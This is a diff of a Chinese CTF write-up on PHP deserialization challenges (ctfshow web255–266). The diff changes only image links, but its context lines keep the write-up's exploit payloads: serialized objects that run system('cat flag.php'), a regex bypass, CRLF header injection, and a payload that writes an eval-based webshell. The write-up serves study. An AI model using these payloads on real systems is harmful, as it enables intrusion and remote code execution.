@@ -182,7 +182,7 @@ php
 ?>
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web255/3NX_IIN%60F%60%24RNGXZW6SVZZT.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web255/3NX_IIN`F`%24RNGXZW6SVZZT.png)
+[![img](../../../_assets/images/63a134f43b055e9b4c37cff5a03cd515718cf16c60a0762e53310251adea09e5.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web255/3NX_IIN`F`%24RNGXZW6SVZZT.png)
 运行后得到
 
 ```
@@ -191,7 +191,7 @@ O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:
 ```
 
 记得用bp的话要进行一个url编码
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web255/_G%7BLZ%5D3IX1XV0C2O%28ZJ%24K~0.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web255/_G{LZ]3IX1XV0C2O(ZJ%24K~0.png)
+[![img](../../../_assets/images/5dbb6e76c147f0d2e22abf019d662214f64edfa50286e3b46e11dee10646c45b.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web255/_G{LZ]3IX1XV0C2O(ZJ%24K~0.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web256)web256
 
@@ -263,7 +263,7 @@ Code
 O:11:"ctfShowUser":3:{s:8:"username";s:6:"dotast";s:8:"password";s:6:"123456";s:5:"isVip";b:1;}
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web256/31%60GRJOVOZG%5DK%40%60%60G%29IE7%29I.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web256/31`GRJOVOZG]K@``G)IE7)I.png)
+[![img](../../../_assets/images/522fbba4d2189cb3eb34fc297f72c0f0fb93f3bbb18a2ae2241bbc33217efd5a.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web256/31`GRJOVOZG]K@``G)IE7)I.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web257)web257
 
@@ -341,7 +341,7 @@ Code
 O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web257/7%5DK%407ZP_%7BJB5GDQQD19AH82.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web257/7]K@7ZP_{JB5GDQQD19AH82.png)
+[![img](../../../_assets/images/24d4c97aa49cfb6b97f8063d8986036153143bf15af35ade2644b841c5f1811e.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web257/7]K@7ZP_{JB5GDQQD19AH82.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web258)web258
 
@@ -395,7 +395,7 @@ if(isset($username) && isset($password)){
 ```
 
 在上一题的基础上对输入做了正则过滤
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web258/6%28U8F%258M4_MSU44UJ%29%258Q0Y.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web258/6(U8F%8M4_MSU44UJ)%8Q0Y.png)
+[![img](../../../_assets/images/39ca8a8072745f18527d3219bef8fdb28214f45610392af0d035395e60d81b89.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web258/6(U8F%8M4_MSU44UJ)%8Q0Y.png)
 在数字前面加一个`+`号即可绕过正则
 
 ```
@@ -432,7 +432,7 @@ Code
 O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web258/YPDGH3%40LKV3DU6MW%405RQ%7BTK.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web258/YPDGH3@LKV3DU6MW@5RQ{TK.png)
+[![img](../../../_assets/images/6115bdbd17ca2d6e2897e7312df44a80cc156da51ab6fbb06f95120a7ec5213c.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web258/YPDGH3@LKV3DU6MW@5RQ{TK.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web259)web259
 
@@ -458,8 +458,8 @@ php
     $c->dotast();
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/0.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/0.png)
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/2.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/2.png)
+[![img](../../../_assets/images/c47ee704c284455db0e96153862f9ba9b08b36ba0cfe7f607cf51084136fbab3.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/0.png)
+[![img](../../../_assets/images/fc6f8c97d52bbbc18a3abbdb727b2fc586b14ec3ad76179d4f5f74ded2e1b526.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/2.png)
 
 **CRLF漏洞**
 
@@ -479,8 +479,8 @@ php
 
 执行后可以看到成功控制了请求头
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/image-20210829165019106.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165019106.png)
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/image-20210829165048219.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165048219.png)但还有一个问题需要解决，POST数据指定请求头为`Content-Type:application/x-www-form-urlencoded`，我们需要控制`Content-Type`，但从上图中可以发现它位于`SOAPAtion`上方。
+[![img](../../../_assets/images/43851b2f187f8dd06fdce40fec8f43b07b05755a764e01427e29cf10ad597792.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165019106.png)
+[![img](../../../_assets/images/a1c5c7c8322fc386a0368eadd273dcbf2729864e7cbe175da7441074c59fd1d8.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165048219.png)但还有一个问题需要解决，POST数据指定请求头为`Content-Type:application/x-www-form-urlencoded`，我们需要控制`Content-Type`，但从上图中可以发现它位于`SOAPAtion`上方。
 继续往上，可以发现`User-Agent`位于`Content-Type`上方，这个位置也可以进行注入，所以我们再`User-Agent`进行注入
 
 ```
@@ -494,8 +494,8 @@ php
     $c->dotast();
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/%40%40N4MY7%28%29%24VPJK%5BT%287OJ%40%24C.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/@@N4MY7()%24VPJK[T(7OJ@%24C.png)
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/651651651.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/651651651.png)
+[![img](../../../_assets/images/a4bb4957535a52529636f119ccc2d4bad4f29c12ca1e7a89d43854ffaf4bbe91.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/@@N4MY7()%24VPJK[T(7OJ@%24C.png)
+[![img](../../../_assets/images/9fbf4ff833efa31fa0fc21377eebf29e77737e26f2e5d89b9e44e0b727210740.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/651651651.png)
 如图，构造任意post请求成功！到此，一系列流程都弄懂后，我们回到题目本身
 **flag.php**
 
@@ -546,9 +546,9 @@ https://support.cloudflare.com/hc/zh-cn/articles/200170986-Cloudflare-%E5%A6%82%
 ```
 
 运行php
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/3P2RS_%28_OD3MNXDOSSRMAQ5.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/3P2RS_(_OD3MNXDOSSRMAQ5.png)get参数`vip`传入
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/PQDH%7DSL4M%40T%28U%5D%5DYSS%5D%5BDVI.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/PQDH}SL4M@T(U]]YSS][DVI.png)再访问flag.txt就有了
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/H%7DCHET11SKQYTIBD59X9%25UL.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/H}CHET11SKQYTIBD59X9%UL.png)
+[![img](../../../_assets/images/328e43cc6b35ad2dfd80e7059083c1223a4a2a7906e6800b4bbb823ed92e46fe.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/3P2RS_(_OD3MNXDOSSRMAQ5.png)get参数`vip`传入
+[![img](../../../_assets/images/58389de7b7b3b1d73421a9feb355cf88b6218c66280cdd1f50e289cdb0bfcf95.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/PQDH}SL4M@T(U]]YSS][DVI.png)再访问flag.txt就有了
+[![img](../../../_assets/images/50cdfd9a5a292d4b0db899d023431a0ab9c2ee3b6e598b2b58fd74e732a9018e.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/H}CHET11SKQYTIBD59X9%UL.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web260)web260
 
@@ -612,7 +612,7 @@ unserialize($_GET['vip']);
 ```
 
 观察代码，可以发现`__invoke`有命令执行，`__destruct`有文件写入；注意到有一个`__unserialize`魔术方法
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web261/N6BRWVT.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web261/N6BRWVT.png)
+[![img](../../../_assets/images/698257227fd25a573b3adb5019a19c474f42e214fc20d785001187fc973e797e.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web261/N6BRWVT.png)
 显然
 
 > 如果 `__unserialize()` 和 `__wakeup()`两个魔术方法都定义在用一个对象中， 则只有 `__unserialize()` 方法会生效，`__wakeup()` 方法会被忽略。
@@ -639,7 +639,7 @@ Code
 ?vip=O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A30%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bdotast%5D%29%3B%3F%3E%22%3B%7D
 ```
 
-写入webshell之后，去获取flag[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web261/E.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web261/E.png)
+写入webshell之后，去获取flag[![img](../../../_assets/images/64af907a99f32e9b463258a853e8148c08971e08c95511ee086d1aceea1ff491.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web261/E.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web262)web262
 
@@ -672,7 +672,7 @@ $c = 'O:4:"test":2:{s:8:"username";s:4:"user";s:8:"password";s:4:"test";}user";}
 var_dump(unserialize($c));
 ```
 
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web262/%24F7%60OR_D%7D%5DFLNKJF1%40%29U__W.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web262/%24F7`OR_D}]FLNKJF1@)U__W.png)
+[![img](../../../_assets/images/d4408baa57b536b709ef7f4ec49937708687ce2904aaf6f5214f7b31d8078282.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web262/%24F7`OR_D}]FLNKJF1@)U__W.png)
 很显然，`user`被替换成了`test`，而后面的`user";}`则被忽略
 
 再回到题目本身
@@ -863,7 +863,7 @@ Code
 ```
 
 访问`message.php`
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web264/0D%406H0W%7BX%7DPI%7DW%29SU4CSY_U.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web264/0D@6H0W{X}PI}W)SU4CSY_U.png)
+[![img](../../../_assets/images/a4ca105a81d7d95600c19e17460daef72514075184b53e34a7c73522e6235c2a.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web264/0D@6H0W{X}PI}W)SU4CSY_U.png)
 
 ### [¶](https://www.wlhhlc.top/posts/33757/#web265)web265
 
@@ -984,7 +984,7 @@ O:7:"ctfshow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
 ```
 
 `ctfshow`随便一个字母改成大写，绕过正则
-[![img](https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web266/Y7FN7LODNQ9CJ%5DE%7DQO7_P%7DC.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web266/Y7FN7LODNQ9CJ]E}QO7_P}C.png)
+[![img](../../../_assets/images/72f5294d616a27662c80c3c4db056e27d39aed774bb12c84b85febf29636a5e2.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web266/Y7FN7LODNQ9CJ]E}QO7_P}C.png)
 
 ## 参考来源
 
